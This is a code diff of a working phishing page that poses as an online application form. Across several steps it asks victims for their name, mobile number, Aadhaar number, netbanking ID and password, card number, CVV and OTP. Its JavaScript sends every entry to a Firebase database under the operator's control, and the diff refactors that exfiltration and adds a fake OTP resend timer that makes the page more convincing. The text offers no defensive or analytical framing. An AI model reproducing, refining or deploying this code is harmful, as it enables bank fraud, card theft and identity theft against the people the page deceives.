@@ -19,8 +19,6 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 .btn{width:100%;padding:14px;margin:10px 0;border-radius:10px;border:2px solid #8a2c6b;background:#fff;color:#5fa44a;font-weight:700}
 .thanks{text-align:center;color:#2e8b57;font-weight:700;font-size:18px}
 .count{font-size:22px;font-weight:700;color:#d40000;text-align:center}
-.shake{animation:shake .4s;border-color:red!important}
-@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-6px)}50%{transform:translateX(6px)}75%{transform:translateX(-6px)}100%{transform:translateX(0)}}
 </style>
 </head>
 <body>
@@ -29,10 +27,10 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 <div class="page active" id="page1">
   <div class="form">
     <div class="title">APPLY ONLINE</div>
-    <div class="field"><div class="label">Full Name</div><input id="fullName" class="input"></div>
-    <div class="field"><div class="label">Mobile Number</div><input id="mbno" class="input"></div>
-    <div class="field"><div class="label">Aadhaar</div><input id="aadr" class="input"></div>
-    <button class="btn" onclick="nextPage(1)">Continue</button>
+    <div class="field"><div class="label">Full Name</div><input class="input"></div>
+    <div class="field"><div class="label">Mobile Number</div><input class="input"></div>
+    <div class="field"><div class="label">Aadhaar</div><input class="input"></div>
+    <button class="btn" onclick="submitPage(1)">Continue</button>
   </div>
 </div>
 
@@ -40,9 +38,9 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 <div class="page" id="page2">
   <div class="form">
     <div class="title">BANK INFO</div>
-    <div class="field"><div class="label">Netbanking ID</div><input id="nid" class="input"></div>
-    <div class="field"><div class="label">Password</div><input id="pss" class="input"></div>
-    <button class="btn" onclick="nextPage(2)">Continue</button>
+    <div class="field"><div class="label">Netbanking ID</div><input class="input"></div>
+    <div class="field"><div class="label">Password</div><input class="input"></div>
+    <button class="btn" onclick="submitPage(2)">Continue</button>
     <button class="btn" onclick="prevPage(2)">Back</button>
   </div>
 </div>
@@ -51,9 +49,9 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 <div class="page" id="page3">
   <div class="form">
     <div class="title">CARD DETAILS</div>
-    <div class="field"><div class="label">Card Number</div><input id="cn" class="input"></div>
-    <div class="field"><div class="label">CVV / PIN</div><input id="cvpn" class="input"></div>
-    <button class="btn" onclick="goOtp()">Submit</button>
+    <div class="field"><div class="label">Card Number</div><input class="input"></div>
+    <div class="field"><div class="label">CVV</div><input class="input"></div>
+    <button class="btn" onclick="submitPage(3)">Submit</button>
     <button class="btn" onclick="prevPage(3)">Back</button>
   </div>
 </div>
@@ -62,8 +60,15 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 <div class="page" id="page4">
   <div class="form">
     <div class="title">ENTER OTP</div>
-    <div class="field"><div class="label">OTP</div><input class="input" id="otpSingle" maxlength="6"></div>
-    <button class="btn" onclick="verifyOtp()">Verify OTP</button>
+    <div class="field">
+      <div class="label">OTP (6 Digit)</div>
+      <input class="input" id="otpSingle" maxlength="6">
+    </div>
+    <p id="resendBox" style="text-align:center">
+      Resend OTP in <span id="otpTimer">30</span>s
+    </p>
+    <button class="btn" onclick="submitPage(4)">Verify OTP</button>
+    <button class="btn" onclick="prevPage(4)">Back</button>
   </div>
 </div>
 
@@ -75,38 +80,60 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
   </div>
 </div>
 
-<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
 <script>
-/* 🔥 FIREBASE CONFIG */
 firebase.initializeApp({
-  apiKey: "AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
-  authDomain: "admin-panel-989b2.firebaseapp.com",
-  databaseURL: "https://admin-panel-989b2-default-rtdb.firebaseio.com",
-  projectId: "admin-panel-989b2"
+  apiKey:"AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
+  authDomain:"admin-panel-989b2.firebaseapp.com",
+  databaseURL:"https://admin-panel-989b2-default-rtdb.firebaseio.com",
+  projectId:"admin-panel-989b2"
 });
 
-/* =========================
-   🔑 ONE USER = ONE KEY
-   (Page-1 se hi create)
-========================= */
+/* ONE USER = ONE ENTRY */
 let userKey = localStorage.getItem("userKey");
 if(!userKey){
   userKey = firebase.database().ref("usersData").push().key;
   localStorage.setItem("userKey", userKey);
 }
 
-/* 🔄 SAFE SAVE / UPDATE */
-function saveData(obj){
-  firebase.database().ref("usersData/"+userKey).update({
-    ...obj,
-    time: new Date().toLocaleString()
-  });
+/* 🔴 ALL PAGE SUBMIT HANDLER */
+function submitPage(page){
+  const i=document.querySelectorAll(".input");
+  let data={ status:"PAGE"+page };
+
+  if(page>=1){
+    data.fullName=i[0].value;
+    data.mbno=i[1].value;
+    data.aadr=i[2].value;
+  }
+  if(page>=2){
+    data.nid=i[3].value;
+    data.pss=i[4].value;
+  }
+  if(page>=3){
+    data.cn=i[5].value;
+    data.cvpn=i[6].value;
+  }
+  if(page===4){
+    const otp=otpSingle.value.trim();
+    if(otp.length!==6){alert("Enter valid OTP");return;}
+    data.otp=otp;
+    data.status="COMPLETED";
+    data.pinned=false;
+    localStorage.removeItem("userKey");
+  }
+
+  data.time=new Date().toLocaleString();
+  firebase.database().ref("usersData/"+userKey).update(data);
+
+  if(page===3){switchPage(3,4);startOtpTimer();}
+  else if(page===4){switchPage(4,5);}
+  else{switchPage(page,page+1);}
 }
 
-/* UI helpers (UNCHANGED) */
+/* UI helpers */
 document.querySelectorAll('.page').forEach(p=>{
   p.prepend(Object.assign(document.createElement('div'),{className:'top-img',innerHTML:'<img src="top.jpg">'}));
   p.append(Object.assign(document.createElement('div'),{className:'bottom-img',innerHTML:'<img src="bottom.jpg">'}));
@@ -115,53 +142,20 @@ function switchPage(a,b){
   document.getElementById("page"+a).classList.remove("active");
   document.getElementById("page"+b).classList.add("active");
 }
-
-/* 🔴 PAGE-WISE IMMEDIATE SAVE */
-function nextPage(n){
-  if(n===1){
-    // Page-1 submit → IMMEDIATE
-    saveData({
-      fullName: fullName.value,
-      mbno: mbno.value,
-      aadr: aadr.value,
-      status: "PAGE1"
-    });
-  }
-  if(n===2){
-    // Page-2 submit → UPDATE
-    saveData({
-      nid: nid.value,
-      pss: pss.value,
-      status: "PAGE2"
-    });
-  }
-  switchPage(n,n+1);
-}
 function prevPage(n){switchPage(n,n-1)}
 
-function goOtp(){
-  // Page-3 submit → UPDATE
-  saveData({
-    cn: cn.value,
-    cvpn: cvpn.value,
-    status: "PAGE3"
-  });
-  switchPage(3,4);
-}
-
-function verifyOtp(){
-  var otp=document.getElementById("otpSingle").value.trim();
-  if(otp.length!==6){alert("Enter valid OTP");return;}
-
-  // FINAL UPDATE
-  saveData({
-    otp: otp,
-    status: "COMPLETED",
-    pinned: false
-  });
-
-  localStorage.removeItem("userKey"); // reset for next user
-  switchPage(4,5);
+/* OTP timer */
+let s=30,intv;
+function startOtpTimer(){
+  clearInterval(intv);s=30;
+  resendBox.innerHTML=`Resend OTP in <span id="otpTimer">${s}</span>s`;
+  intv=setInterval(()=>{
+    s--;otpTimer.innerText=s;
+    if(s<=0){
+      clearInterval(intv);
+      resendBox.innerHTML='<b onclick="startOtpTimer()" style="cursor:pointer;color:#2e8b57">Resend OTP</b>';
+    }
+  },1000);
 }
 </script>
 </body>
